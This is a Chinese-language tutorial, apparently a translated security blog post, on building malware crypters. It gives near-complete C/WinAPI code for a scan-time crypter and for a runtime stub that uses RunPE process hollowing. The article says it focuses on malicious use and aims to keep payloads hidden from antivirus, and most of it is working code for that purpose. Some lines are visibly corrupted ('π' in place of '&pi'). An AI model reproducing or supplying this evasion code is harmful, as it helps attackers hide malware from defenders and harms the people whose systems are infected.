我一直认为，在黑客世界里，加密技术是一种很神秘的艺术，是一种很隐晦的东西，我们可以查找资料来进行研究。当然，它在黑客世界中已经变得非常普遍，尤其是在2013年和2014年推出了Veil-Evasion和shellter工具。在这篇文章中，我将详细介绍加密工具的类型以及它们在底层的工作原理，然后展示低级代码层面上一些鲜为人知的技术。在阅读完这篇文章后，我希望大家最终能对这些玩意儿的工作原理以及它们在计算机世界中的地位和作用有一定程度的了解。

本文涉及知识点实操练习：[加密实验](https://www.hetianlab.com/expc.do?ec=14804a13-fea8-4bcf-a928-a71a40e7cfa4&pk_campaign=freebuf-wemedia)（通过本实验，了解加密技术）

稍微声明一下：有些材料可能不适合初学者，因为它们需要相当多的Windows底层的知识。包括以下很多技术。

    
    
    掌握 C/C++
    熟悉WinAPI 和对应的文档
    熟悉基础的加密知识
    熟悉PE文件的结构
    熟悉 Windows 虚拟内存
    熟悉进程和线程

### 密码学的两个方面

当我们谈起对于密码学的印象时，我们经常会想到
"这是一种处理信息的手段，防止信息被泄露出去"。我们大多数人都把它看成是一种防御机制，其应用的目的在于确保信息的安全，阻止恶意的攻击。当然，我们很清楚这一点，因为它被发明出来的唯一目的就是保护数据，然而，正如我们很快就会看到的那样，密码学的功能已经远远不止这些。

如果我们使用传统的密码学来进行恶意攻击，即设计恶意软件，利用密码学提供的优势。这些类型的恶意软件在现代已经非常普遍，包括勒索软件和非对称后门等，它们主要涉及公钥密码学。

#### 反病毒机制

为了能够设计出绕过杀毒软件的方式，我们必须首先要明白杀毒软件的杀毒方式。我将简单介绍一下杀毒软件检测应用程序采用的两种主要方法。

##### 基于签名的检测

顾名思义，基于签名的检测是一种将应用程序的签名与相应的已知恶意软件的数据库进行交叉参考匹配的技术。这是预防和遏制之前出现过的恶意软件的有效措施。

##### 基于启发式检测

虽然基于签名的检测可以防止大多数以前已知的恶意软件，但它也有缺点，因为恶意软件作者可以针对这种方法添加保护措施，如使用多态和变形代码等。基于启发式的检测会监控应用程序的行为和特征，并将其与已知的恶意行为进行匹配。请注意，只有在应用程序正在运行的情况下才会进行这种检测。

当然，杀毒软件要比这个高级很多。由于这已经超出了文章讨论的范围，也超出了我的理解范围，所以这里不会涉及这些信息。

#### 加密技术简介

加密器是被设计用来保护文件内部信息的软件，并且在执行后，用解密程序提取后能够完整地提供信息。请注意，虽然加密器可以被用于恶意目的，但它也主要用于混淆数据，防止对软件逆向工程。在本文中，我们将重点讨论恶意使用的情况。那么，这是如何工作的呢？让我们先来了解密码器的各部分，看一下它们的作用。

加密器负责对目标对象进行加密。

    
    
    +-------------+      +-----------+      +-------------------+     +--------+
    |  Your file  |  ->  |  Crypter  |  =>  |  Encrypted file   |  +  |  Stub  |
    +-------------+      +-----------+      +-------------------+     +--------+
    
    
    
    +------------------+     +--------+                  +---------------+
    |  Encrypted file  |  +  |  Stub  |  = Execution =>  | Original File | 
    +------------------+     +--------+                  +---------------+
    

### 扫描时加密器

这些类型的加密器由于能够加密磁盘上的数据而被称为扫描时加密器，杀毒软件可以对文件进行扫描，例如基于签名的检测。在这一阶段，只要应用的混淆技术是足够强大的，杀毒软件将永远无法检测到任何恶意活动。

### 运行时加密器

这些加密器将加密技术提升到了一个新的水平，能够在内存中运行时根据需要对数据进行加密。通过这样做，能够使恶意软件在杀毒软件作出反应之前加载和执行。在这个阶段，一个应用程序可以快速地运行它的有效载荷并达到它的目标。但是恶意软件完全有可能在执行阶段触发杀毒软件的基于启发式的检测策略，所以恶意软件作者应该小心。

现在我们已经介绍了高层次的内容，那么我们就来看看这两种类型的实例。

#### 编写扫描时间加密器

扫描时加密器是两者中比较简单的，因为它不需要虚拟内存和进程/线程的知识。本质上，stub会对文件进行处理，把它放到磁盘上的某个地方，然后执行它。下面记录了一个扫描时加密器的设计。

注意：为了简洁和可读性，内容将不包含错误检查。

##### 加密器和stub伪代码

    
    
    1.检查是否有命令行参数
    +-> 2. 如果有命令行参数，则作为加密器对文件进行加密处理
    |   3. 打开目标文件
    |   4. 读取文件内容
    |   5. 对文件内容进行加密
    |   6. 创建一个新文件
    |   7. 将加密后的文件写入新文件
    |   8. 結束
    |
    +-> 2. 如果没有命令行参数，则作为stub
        3. 打开加密文件
        4. 读取文件内容
        5. 解密文件内容
        6. 创建一个临时文件
        7. 将解密后的内容写入临时文件
        8. 执行文件
        9. 完成
        
    

这个设计方案在同一个可执行文件中同时实现了加密器和stub，我们可以这样做，是因为这两个操作非常相似。下面用代码来介绍一下设计方案。

首先，我们需要定义main和两个条件，这两个条件定义了是执行加密器还是stub。

    
    
    int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
        if (__argc < 2) {
            // stub routine
        } else {
            // crypter routine
        }
    
        return EXIT_SUCCESS;
    }
    

由于我们将应用程序设计成了窗口应用程序，我们不能像通常基于控制台的应用程序中那样检索 argc 和 argv，但是微软提供了使用 **argc 和**
argv的解决方案。如果命令行参数 __argv[1] 存在，应用程序将尝试对指定的文件进行加密，否则，它将尝试解密一个被加密的文件。

接下来是加密程序，我们需要 __argv[1] 来指定文件的句柄和它的大小，这样我们就可以把它的字节复制到一个缓冲区中进行加密。

    
    
    int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
        if (__argc < 2) {
            // stub routine
        } else {
            // crypter routine
            // open file to crypt
            HANDLE hFile = CreateFile(__argv[1], FILE_READ_ACCESS, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            // get file size
            DWORD dwFileSize = GetFileSize(hFile, NULL);
            
            // crypt and get crypted bytes
            LPVOID lpFileBytes = Crypt(hFile, dwFileSize);
        }
    
        return EXIT_SUCCESS;
    }
    

Crypt函数主要是将文件内容读入到一个缓冲区中，然后对其进行加密，然后返回一个指向缓冲区的指针。

    
    
    LPVOID Crypt(HANDLE hFile, DWORD dwFileSize) {
        // allocate buffer for file contents
        LPVOID lpFileBytes = malloc(dwFileSize);
        // read the file into the buffer
        ReadFile(hFile, lpFileBytes, dwFileSize, NULL, NULL);
    
        // apply XOR encryption
        int i;
        for (i = 0; i < dwFileSize; i++) {
            *((LPBYTE)lpFileBytes + i) ^= Key[i % sizeof(Key)];
        }
    
        return lpFileBytes;
    }
    

  

现在我们有了加密的字节，我们需要创建一个新的文件，然后将这些字节写入其中。

    
    
    int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
        if (__argc < 2) {
            // stub routine
        } else {
            // crypter routine
            
            ...
    
            // get crypted file name in current directory
            CHAR szCryptedFileName[MAX_PATH];
            GetCurrentDirectory(MAX_PATH, szCryptedFileName);
            strcat(szCryptedFileName, "\\");
            strcat(szCryptedFileName, CRYPTED_FILE);
            // open handle to new crypted file
            HANDLE hCryptedFile = CreateFile(szCryptedFileName, FILE_WRITE_ACCESS, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    
            // write to crypted file
            WriteFile(hCryptedFile, lpFileBytes, dwFileSize, NULL, NULL);
            CloseHandle(hCryptedFile);
            free(lpFileBytes);
        }
    
        return EXIT_SUCCESS;
    }
    

加密器部分差不多就是这些了。注意，我们使用了一个简单的XOR来加密文件的内容，如果我们能够获得密钥，这种方案的安全性可能是不够的。如果我们想更加安全，我们可以使用其他的加密方案，如(x)TEA。我们不需要完整的加密算法，因为我们的目的是为了避免基于签名的检测，因此这么做完全是矫枉过正。保持文件小而简单最重要。

让我们继续进入stub例程。对于stub程序，我们要检索当前目录下的加密文件，然后将解密后的内容写入一个临时文件中进行执行。

  

我们首先要得到当前的要处理的文件，然后打开文件，得到文件大小。

  

    
    
    int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
        if (__argc < 2) {
            // stub routine
            // get target encrypted file
            CHAR szEncryptedFileName[MAX_PATH];
            GetCurrentDirectory(MAX_PATH, szEncryptedFileName);
            strcat(szEncryptedFileName, "\\");
            strcat(szEncryptedFileName, CRYPTED_FILE);
    
            // get handle to file
            HANDLE hFile = CreateFile(szEncryptedFileName, FILE_READ_ACCESS, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    
            // get file size
            DWORD dwFileSize = GetFileSize(hFile, NULL);
        } else {
            // crypter routine
        }
    
        return EXIT_SUCCESS;
    }
    

  

和加密器例程差不多。接下来，我们要读取文件内容，并得到解密后的字节。由于XOR操作恢复了给定的公共位的值，我们可以简单地重用Crypt函数。之后，我们需要创建一个临时文件，并将解密后的字节写入其中。

    
    
    int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
        if (__argc < 2) {
            // stub routine
            
            ...
    
            // decrypt and obtain decrypted bytes
            LPVOID lpFileBytes = Crypt(hFile, dwFileSize);
            CloseHandle(hFile);
    
            // get file in temporary directory
            CHAR szTempFileName[MAX_PATH];
            GetTempPath(MAX_PATH, szTempFileName);
            strcat(szTempFileName, DECRYPTED_FILE);
    
            // open handle to temp file
            HANDLE hTempFile = CreateFile(szTempFileName, FILE_WRITE_ACCESS, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            // write to temporary file
            WriteFile(hTempFile, lpFileBytes, dwFileSize, NULL, NULL);
            // clean up
            CloseHandle(hTempFile);
            free(lpFileBytes);
        } else {
            // crypter routine
        }
    
        return EXIT_SUCCESS;
    }
    

最后，我们需要执行解密后的应用程序。

    
    
    int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
        if (__argc < 2) {
            // stub routine
            
            ...
    
            // execute file
            ShellExecute(NULL, NULL, szTempFileName, NULL, NULL, 0);
        } else {
            // crypter routine
        }
    
        return EXIT_SUCCESS;
    }
    

请注意，一旦解密后的应用程序被写入磁盘，它很有可能被杀毒软件的基于签名的检测方式检测出来，因此这样有可能捕获大多数的恶意软件。正因为如此，恶意软件的作者需要编写即使他们的应用程序在这种情况下仍然能够执行的功能。

扫描时加密器就到此为止。

#### 编写一个运行时加密器

对于运行时加密器，我的文章只涉及stub，因为它还包括更复杂的过程，所以我们将假设应用程序已经被加密。这些加密器使用一种叫做RunPE的流行技术。它的工作原理是stub先解密应用程序的加密字节，然后模拟Windows加载器，将它们推送到暂停进程的虚拟内存空间中。这个过程完成后，stub将把暂停的进程恢复运行。

注意：为了简洁和可读性，我将不包含错误检查。

##### stub伪代码

    
    
    1. Decrypt application
    2. Create suspended process
    3. Preserve process's thread context
    4. Hollow out process's virtual memory space
    5. Allocate virtual memory
    6. Write application's header and sections into allocated memory
    7. Set modified thread context
    8. Resume process
    9. Finish
    

我们可以看到，这需要相当多的Windows内部知识，包括PE文件结构、Windows内存操作和进程/线程的知识。我强烈建议读者在理解这些知识的基础上来理解下面的材料。

首先，让我们在main中设置两个例程，一个用于解密被加密的应用程序，另一个用于将其加载到内存中执行。

    
    
    APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
        Decrypt();
        RunPE();
    
        return EXIT_SUCCESS;
    }
    

Decrypt函数实现方式完全依赖于用于应用程序的加密方式，这里是一个使用XOR的示例代码。

    
    
    VOID Decrypt(VOID) {
        int i;
        for (i = 0; i < sizeof(Shellcode); i++) {
            Shellcode[i] ^= Key[i % sizeof(Key)];
        }
    }
    

现在，应用程序已经被解密，让我们来看看神奇的地方。在这里，我们通过检查DOS和PE签名来验证该应用程序是否是一个有效的PE文件。

    
    
    VOID RunPE(VOID) {
        // check valid DOS signature
        PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)Shellcode;
        if (pidh->e_magic != IMAGE_DOS_SIGNATURE) return;
    
        // check valid PE signature
        PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD)Shellcode + pidh->e_lfanew);
        if (pinh->Signature != IMAGE_NT_SIGNATURE) return;
    }
    

  

现在，我们将创建暂停的进程。

    
    
    VOID RunPE(VOID) {
        ...
    
        // get own full file name
        CHAR szFileName[MAX_PATH];
        GetModuleFileName(NULL, szFileName, MAX_PATH);
    
        // initialize startup and process information
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        ZeroMemory(π, sizeof(pi));
        // required to set size of si.cb before use
        si.cb = sizeof(si);
        // create suspended process
        CreateProcess(szFileName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, π);
    
    }
    

注意，szFileName可以是任何可执行文件的完整路径，如explorer.exe或iexplore.exe，但在本例中，我们将使用stub的文件。CreateProcess函数将在暂停状态下创建一个指定文件的子进程，这样我们就可以根据自己的需要来修改它的虚拟内存内容。

    
    
    VOID RunPE(VOID) {
        ...
    
        // obtain thread context
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi.Thread, &ctx);
    
    }
    

现在我们清空进程的虚拟内存区域，这样我们就可以为应用程序分配自己的运行空间。为此，我们需要一个函数，而这个函数对我们来说并不是现成的，因此我们需要一个函数指针，指向一个从ntdll.dll
文件中动态检索内容的函数。

    
    
    typedef NTSTATUS (*fZwUnmapViewOfSection)(HANDLE, PVOID);
    
    VOID RunPE(VOID) {
        ...
    
        // dynamically retrieve ZwUnmapViewOfSection function from ntdll.dll
        fZwUnmapViewOfSection pZwUnmapViewOfSection = (fZwUnmapViewOfSection)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwUnmapViewOfSection");
        // hollow process at virtual memory address 'pinh->OptionalHeader.ImageBase'
        pZwUnMapViewOfSection(pi.hProcess, (PVOID)pinh->OptionalHeader.ImageBase);
    
        // allocate virtual memory at address 'pinh->OptionalHeader.ImageBase' of size `pinh->OptionalHeader.SizeofImage` with RWX permissions
        LPVOID lpBaseAddress = VirtualAllocEx(pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase, pinh->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    }
    

由于被暂停的进程在其虚拟内存空间内有自己的内容，我们需要从内存中对它进行解映射，然后分配我们自己的内容，这样我们就有访问权限来加载我们的应用程序的映像。我们将通过WriteProcessMemory函数来实现。首先，我们需要像Windows加载器一样，先写头文件，然后分别写每个部分。这一部分需要对PE文件结构有一个全面的了解。

  

    
    
    VOID RunPE(VOID) {
        ...
    
        // write header
        WriteProcessMemory(pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase, Shellcode, pinh->OptionalHeader.SizeOfHeaders, NULL);
    
        // write each section
        int i;
        for (i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
            // calculate and get ith section
            PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD)Shellcode + pidh->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i);
            // write section data
            WriteProcessMemory(pi.hProcess, (LPVOID)(lpBaseAddress + pish->VirtualAddress), (LPVOID)((DWORD)Shellcode + pish->PointerToRawData), pish->SizeOfRawData, NULL);
        }
    
    }
    

现在一切就绪，我们只需修改上下文的切入点地址，然后恢复暂停的线程。

    
    
    VOID RunPE(VOID) {
        ...
     
        // set appropriate address of entry point
        ctx.Eax = pinh->OptionalHeader.ImageBase + pinh->OptionalHeader.AddressOfEntryPoint;
        SetThreadContext(pi.hThread, &ctx);
     
        // resume and execute our application
        ResumeThread(pi.hThread);
    }
    

现在，应用程序已经开始在内存中运行，希望杀毒软件不会检测到它。

